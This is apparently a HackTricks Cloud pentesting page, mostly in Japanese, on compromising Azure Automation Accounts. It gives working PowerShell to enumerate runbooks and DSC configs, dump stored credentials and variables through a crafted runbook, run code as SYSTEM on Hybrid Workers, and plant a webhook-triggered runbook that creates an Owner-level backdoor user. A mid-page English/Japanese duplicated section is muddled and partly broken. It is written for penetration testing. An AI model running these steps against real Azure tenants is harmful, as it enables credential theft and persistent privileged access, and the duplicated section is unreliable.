# Az - Automation Account

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社の広告を見たい**場合や、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**フォロー**する 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリに参加する

</details>

## 基本情報

Azure Automationは、クラウドベースの自動化、オペレーティングシステムの更新、および構成サービスを提供し、Azure環境と非Azure環境の一貫した管理をサポートします。プロセスの自動化、構成管理、更新管理、共有機能、および異種環境の機能が含まれています。

これらはAzureの「**スケジュールされたタスク**」のようなもので、Azure環境の**管理**、チェック、および構成を実行するためのものです。

### Run As アカウント

**Run as アカウント**を使用すると、Azure ADに**自己署名証明書を持つアプリケーション**が作成され、**サービスプリンシパル**が作成され、**Contributor**ロールが**現在のサブスクリプション**のアカウントに割り当てられます（多くの特権があります）。\
MicrosoftはAutomation Accountには**Managed Identity**を使用することを推奨しています。

{% hint style="warning" %}
これは**2023年9月30日に削除され、Managed Identityに変更されます**。
{% endhint %}

## Runbooks & Jobsの侵害

**Runbooks**を使用すると、**任意のPowerShell**コードを実行できます。これは、攻撃者が**関連するプリンシパル**の権限を盗むために悪用される可能性があります。\
**Runbooks**の**コード**には、クレデンシャルなどの**機密情報**も含まれている場合があります。

**ジョブ**を**読む**ことができる場合は、実行の**出力**（潜在的な**機密情報**）を含んでいるので、確認してください。

`Automation Accounts`に移動 --> `<選択したAutomation Account>` --> `Runbooks/Jobs/Hybrid worker groups/Watcher tasks/credentials/variables/certificates/connections`

### Hybrid Worker

Runbookは、Azure内の**コンテナ**または**Hybrid Worker**で実行できます。\
**Log Analytics Agent**がVMに展開され、ハイブリッドワーカーとして登録されます。\
ハイブリッドワーカージョブは、Windowsでは**SYSTEM**で、Linuxでは**nxautomation**アカウントで実行されます。\
各ハイブリッドワーカーは、**ハイブリッドワーカーグループ**に登録されます。

したがって、**Windows Hybrid Worker**で**Runbook**を実行することを選択できる場合、そのマシン内で**システム**として**任意のコマンド**を実行できます。

## State Configuration (SC)の侵害

Azure Automationの**State Configuration**は、Azureの構成管理サービスであり、クラウドまたはオンプレミスのデータセンターのノードに対してPowerShell Desired State Configuration (DSC) [configurations](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations)を記述、管理、およびコンパイルすることができます。このサービスでは[DSC Resources](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources)をインポートし、構成を対象ノードに割り当てることもできます。AzureポータルでAzure Automation State Configurationにアクセスするには、**Configuration Management**の下にある**State configuration (DSC)**を選択します。

これらの構成には**機密情報**が含まれている場合があります。

### RCE

SCを悪用して、管理されたマシンで任意のスクリプトを実行することが可能です。

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## 列挙

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
### ランブックの作成

{% code overflow="wrap" %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
{% endcode %}

### ランブックを使用して、Automation Accountで定義された資格情報と変数を外部に持ち出す

In this technique, we will use a run book in Azure Automation to exfiltrate credentials and variables defined in an Automation Account. This can be useful during a penetration test to gather sensitive information.

このテクニックでは、Azure Automationのランブックを使用して、Automation Accountで定義された資格情報と変数を外部に持ち出します。これは、ペネトレーションテスト中に機密情報を収集するために役立ちます。

First, we need to create a run book in the Azure portal. Go to the Automation Account and navigate to the "Runbooks" section. Click on "Create a runbook" and provide a name and description for the run book.

まず、Azureポータルでランブックを作成する必要があります。Automation Accountに移動し、「ランブック」セクションに移動します。[ランブックの作成]をクリックし、ランブックの名前と説明を入力します。

Next, we need to add the necessary code to the run book to exfiltrate the credentials and variables. The following PowerShell code can be used:

次に、ランブックに必要なコードを追加して、資格情報と変数を外部に持ち出します。次のPowerShellコードを使用できます。

```powershell
$connectionName = "AzureRunAsConnection"
$servicePrincipalConnection = Get-AutomationConnection -Name $connectionName

Connect-AzAccount -ServicePrincipal `
    -TenantId $servicePrincipalConnection.TenantId `
    -ApplicationId $servicePrincipalConnection.ApplicationId `
    -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint

# Exfiltrate credentials
$credentials = Get-AutomationPSCredential -Name "CredentialName"
$credentials.GetNetworkCredential().Password | Out-File -FilePath "C:\temp\credentials.txt"

# Exfiltrate variables
$variables = Get-AutomationVariable
$variables | Out-File -FilePath "C:\temp\variables.txt"
```

Replace "CredentialName" with the name of the credential you want to exfiltrate. The credentials will be saved in a file called "credentials.txt" in the specified file path.

"CredentialName"を外部に持ち出したい資格情報の名前に置き換えます。資格情報は、指定したファイルパスに「credentials.txt」という名前のファイルに保存されます。

The variables will be saved in a file called "variables.txt" in the specified file path.

変数は、指定したファイルパスに「variables.txt」という名前のファイルに保存されます。

Once the code is added, save the run book and publish it.

コードを追加したら、ランブックを保存して公開します。

To execute the run book and exfiltrate the credentials and variables, go to the "Runbooks" section in the Automation Account and click on the run book. Click on "Start" and follow the prompts to execute the run book.

ランブックを実行して資格情報と変数を外部に持ち出すには、Automation Accountの「ランブック」セクションに移動し、ランブックをクリックします。[開始]をクリックし、指示に従ってランブックを実行します。

After the run book has finished executing, you can retrieve the exfiltrated credentials and variables from the specified file path.

ランブックの実行が終了したら、指定したファイルパスから外部に持ち出された資格情報と変数を取得できます。
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% hint style="info" %}
同じことを、既存のランブックを変更して、ウェブコンソールからも行うことができます。
{% endhint %}

## 持続性

### 高特権ユーザーを作成する自動化

* 新しい自動化アカウントを作成します。
* "Azure Run As アカウントを作成する": Yes
* AzureADユーザーをOwner権限で作成する新しいランブックをインポートします。
* このブログのサンプルランブックはこちらにあります - [https://github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
* ランブックを公開します。
* ランブックにWebhookを追加します。
* AzureADモジュールを自動化アカウントに追加します。
* Azure Automationモジュールを更新します。
* "ユーザー管理者"と"サブスクリプションオーナー"の権限を自動化アカウントに割り当てます。
* 最終的にアクセスを失います...
*   新しいユーザーを作成するために、ポストリクエストでWebhookをトリガーします。

```powershell
$uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
$AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```

## 参考文献

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
